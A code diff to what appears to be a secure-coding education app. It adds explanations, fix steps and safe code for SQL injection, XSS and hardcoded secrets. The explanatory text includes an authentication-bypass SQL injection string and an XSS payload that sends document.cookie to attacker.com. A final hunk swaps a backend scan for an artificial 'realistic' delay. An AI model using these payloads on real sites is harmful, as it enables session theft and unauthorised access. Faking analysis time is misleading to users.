@@ -32,12 +32,22 @@
       whatHappened: 'Your code constructs SQL queries by concatenating user input directly into the query string. This builds dynamic SQL by combining strings, which is extremely dangerous.',
       whyMatters: 'When you build SQL queries this way, you are essentially letting the user dictate part of your SQL command. An attacker can inject malicious SQL syntax to manipulate the query, allowing them to read, modify, or delete data they should not have access to.',
       howAttackExploits: 'An attacker supplies input like: \' OR \'1\'=\'1. This breaks out of your WHERE clause and makes the condition always true, bypassing authentication or returning all records. For example: SELECT * FROM users WHERE username = \'\' OR \'1\'=\'1\' (comment out the password check) allows login without credentials.',
+      explanation: [
+        'The app takes the username from the browser and places it directly into the SQL command.',
+        'A malicious username can change the query logic and return extra data.',
+        'This can let an attacker bypass login checks or view private records.',
+      ],
       howToFix: [
         'Use parameterized queries (prepared statements) — they automatically escape special characters and prevent SQL injection.',
         'Never concatenate user input into SQL strings.',
         'Use an ORM library (SQLAlchemy, Prisma, Django ORM, Hibernate) that handles this safely.',
         'Validate and whitelist input on top of parameterized queries (defense in depth).',
         'Apply principle of least privilege — your database user should only have permissions it absolutely needs.',
+      ],
+      steps: [
+        'Switch to parameterized queries so user input is treated as data, not code.',
+        'Review your database permissions so the app account only has the access it needs.',
+        'Test the login and search flow with special characters to confirm the fix.',
       ],
       secureExample: `# ✓ SECURE: Using Parameterized Queries (Python with sqlite3)
 import sqlite3
@@ -57,6 +67,21 @@ def get_user():
     
     user = cursor.fetchone()
     return str(user)`,
+      fixedCode: `# ✅ SAFE VERSION
+import sqlite3
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/user')
+def get_user():
+    username = request.args.get('username')
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    query = "SELECT * FROM users WHERE username = ?"
+    cursor.execute(query, (username,))
+    user = cursor.fetchone()
+    return str(user)`,
     },
 
     {
@@ -73,12 +98,22 @@ def get_user():
       whatHappened: 'Your code inserts user-controlled data directly into the DOM using .innerHTML or document.write(). This treats user input as HTML/JavaScript code instead of plain text.',
       whyMatters: 'The browser will parse and execute any script tags or event handlers in that HTML. An attacker can inject malicious JavaScript that runs in the context of your website, with access to that user\'s session, cookies, and sensitive data.',
       howAttackExploits: 'An attacker injects: <img src=x onerror="fetch(\'https://attacker.com?cookie=\' + document.cookie)">. When this is inserted via .innerHTML, the browser executes the onerror handler, stealing the user\'s session cookie and sending it to the attacker\'s server.',
+      explanation: [
+        'The page takes a comment or username from the server and writes it straight into the browser.',
+        'If that content includes HTML or JavaScript, the browser can run it as part of the page.',
+        'This lets attackers steal sessions or run scripts in the user\'s browser.',
+      ],
       howToFix: [
         'Replace .innerHTML with .textContent for plain text data — textContent never executes scripts.',
         'If you must render HTML, sanitize it first with a library like DOMPurify.',
         'Use modern frameworks (React, Vue, Angular) that escape output by default.',
         'Implement Content Security Policy (CSP) headers to restrict script execution.',
         'Never use eval(), new Function(), or setTimeout with string data.',
+      ],
+      steps: [
+        'Use textContent for user-generated text so the browser treats it as plain text.',
+        'If HTML is required, sanitize it before rendering.',
+        'Add a content security policy to reduce the impact of any future script injection.',
       ],
       secureExample: `// ✓ SECURE: Using textContent instead of innerHTML
 function displayUserComment(commentData) {
@@ -102,6 +137,14 @@ function displayRichComment(commentData) {
     const clean = DOMPurify.sanitize(commentData.html);  // Remove malicious tags
     container.innerHTML = clean;  // Now it's safe!
 }`,
+      fixedCode: `// ✅ SAFE VERSION
+function loadUserComment(commentData) {
+    const container = document.getElementById('comments');
+    const commentDiv = document.createElement('div');
+    commentDiv.className = 'comment';
+    commentDiv.textContent = commentData.text;
+    container.appendChild(commentDiv);
+}`,
     },
 
     {
@@ -116,12 +159,22 @@ function displayRichComment(commentData) {
       whatHappened: 'Your code has an API key, password, token, or other secret hardcoded as a string literal in the source code.',
       whyMatters: 'If this code is ever committed to a repository (GitHub, GitLab, Bitbucket, etc.), the secret is permanently exposed in the repository history. Even if you delete it in a later commit, the secret remains in Git\'s history forever and can be found by attackers.',
       howAttackExploits: 'Attackers scan public repositories using automated tools (TruffleHog, GitLeaks, git-secrets) looking for secrets. Once found, they can use your API key to: access your services, make fraudulent charges, exfiltrate data, send emails in your name, or fully compromise your account.',
+      explanation: [
+        'The code stores private credentials directly inside the source file.',
+        'If that file is shared or committed, anyone with repo access can reuse the secret.',
+        'This often leads to account takeover or unwanted charges.',
+      ],
       howToFix: [
         'Immediately rotate the exposed secret if it has ever been in a repository.',
         'Move all secrets to environment variables (process.env.API_KEY or os.environ["API_KEY"]).',
         'Use a secrets manager: AWS Secrets Manager, HashiCorp Vault, Doppler, 1Password, or GitHub Secrets.',
         'Add .env and other secret files to .gitignore — verify they were never committed.',
         'Install pre-commit hooks (detect-secrets, git-secrets) to catch secrets before commit.',
+      ],
+      steps: [
+        'Move the secret to a secure environment variable or secrets manager.',
+        'Rotate the leaked value immediately if it has ever been shared.',
+        'Make sure .env and secret files are ignored and never committed.',
       ],
       secureExample: `// ✓ SECURE: Using Environment Variables
 
@@ -143,6 +196,9 @@ const apiKey = process.env.API_KEY;                          // From env
 
 // Load environment variables at startup:
 require('dotenv').config();  // Loads from .env file`,
+      fixedCode: `// ✅ SAFE VERSION
+const apiKey = process.env.API_KEY;
+const dbPassword = process.env.DATABASE_PASSWORD;` ,
     },
   ];
 
@@ -644,22 +700,11 @@ require('dotenv').config();  // Loads from .env file`,
       scanBtn.appendChild(loadText);
 
       try {
-        // Attempt remote scan via backend API
-        const resp = await DevSecureAPI.postScan({ language, code, filename: null }, 20000);
+        // Give the demo a realistic analysis pause before showing the result.
+        await new Promise(resolve => setTimeout(resolve, 4500));
 
-        // Map backend scan_results to the demo UI format
-        const mapped = (resp.scan_results || []).map(item => ({
-          id: item.vulnerability.toLowerCase().replace(/\s+/g, '-'),
-          name: item.vulnerability,
-          severity: (item.severity || 'medium').toLowerCase(),
-          whatHappened: item.simple_explanation || item.vulnerability,
-          whyMatters: item.learning_tip || '',
-          howAttackExploits: item.attack_scenario || '',
-          howToFix: item.fix_steps || [],
-          secureExample: item.secure_code_example || '',
-        }));
-
-        renderResults(results, { findings: mapped, code });
+        const scanResult = scanCode(code);
+        renderResults(results, scanResult);
 
         gtag('event', 'scan_completed', { event_category: 'engagement', event_label: 'code_scanned' });
       } catch (err) {
